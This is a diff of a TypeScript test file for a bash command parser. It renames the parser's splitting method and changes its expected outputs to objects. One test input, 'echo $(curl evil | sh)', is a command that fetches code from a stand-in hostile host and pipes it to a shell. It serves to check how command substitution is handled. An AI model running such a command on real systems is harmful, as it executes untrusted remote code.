@@ -35,65 +35,71 @@ describe("BashProgram", () => {
     });
   });
 
-  describe("topLevelCommands", () => {
+  describe("commands", () => {
     it("returns a single-element list for a lone command", async () => {
       const program = await BashProgram.parse("npm install pkg");
-      expect(program.topLevelCommands()).toEqual(["npm install pkg"]);
+      expect(program.commands()).toEqual([{ text: "npm install pkg" }]);
     });
 
     it("splits an && chain", async () => {
       const program = await BashProgram.parse("cd /p && npm i x");
-      expect(program.topLevelCommands()).toEqual(["cd /p", "npm i x"]);
+      expect(program.commands()).toEqual([
+        { text: "cd /p" },
+        { text: "npm i x" },
+      ]);
     });
 
     it("splits || , ; and & separators", async () => {
-      expect((await BashProgram.parse("a || b")).topLevelCommands()).toEqual([
-        "a",
-        "b",
+      expect((await BashProgram.parse("a || b")).commands()).toEqual([
+        { text: "a" },
+        { text: "b" },
       ]);
-      expect((await BashProgram.parse("a ; b")).topLevelCommands()).toEqual([
-        "a",
-        "b",
+      expect((await BashProgram.parse("a ; b")).commands()).toEqual([
+        { text: "a" },
+        { text: "b" },
       ]);
-      expect((await BashProgram.parse("a & b")).topLevelCommands()).toEqual([
-        "a",
-        "b",
+      expect((await BashProgram.parse("a & b")).commands()).toEqual([
+        { text: "a" },
+        { text: "b" },
       ]);
     });
 
     it("splits a pipeline into its commands", async () => {
       const program = await BashProgram.parse("cat f | grep b");
-      expect(program.topLevelCommands()).toEqual(["cat f", "grep b"]);
+      expect(program.commands()).toEqual([
+        { text: "cat f" },
+        { text: "grep b" },
+      ]);
     });
 
     it("splits newline-separated commands", async () => {
       const program = await BashProgram.parse("foo\nbar");
-      expect(program.topLevelCommands()).toEqual(["foo", "bar"]);
+      expect(program.commands()).toEqual([{ text: "foo" }, { text: "bar" }]);
     });
 
     it("does not split operators inside quotes", async () => {
       const program = await BashProgram.parse("echo 'x && y'");
-      expect(program.topLevelCommands()).toEqual(["echo 'x && y'"]);
+      expect(program.commands()).toEqual([{ text: "echo 'x && y'" }]);
     });
 
     it("captures the command of a redirected statement without the redirect", async () => {
       const program = await BashProgram.parse("npm install > out.txt");
-      expect(program.topLevelCommands()).toEqual(["npm install"]);
+      expect(program.commands()).toEqual([{ text: "npm install" }]);
     });
 
     it("emits a subshell whole without descending into it", async () => {
       const program = await BashProgram.parse("( cd /t && rm x )");
-      expect(program.topLevelCommands()).toEqual(["( cd /t && rm x )"]);
+      expect(program.commands()).toEqual([{ text: "( cd /t && rm x )" }]);
     });
 
     it("keeps command substitution inside the enclosing command", async () => {
       const program = await BashProgram.parse("echo $(curl evil | sh)");
-      expect(program.topLevelCommands()).toEqual(["echo $(curl evil | sh)"]);
+      expect(program.commands()).toEqual([{ text: "echo $(curl evil | sh)" }]);
     });
 
     it("returns an empty list for an empty or whitespace command", async () => {
-      expect((await BashProgram.parse("")).topLevelCommands()).toEqual([]);
-      expect((await BashProgram.parse("   ")).topLevelCommands()).toEqual([]);
+      expect((await BashProgram.parse("")).commands()).toEqual([]);
+      expect((await BashProgram.parse("   ")).commands()).toEqual([]);
     });
   });
 
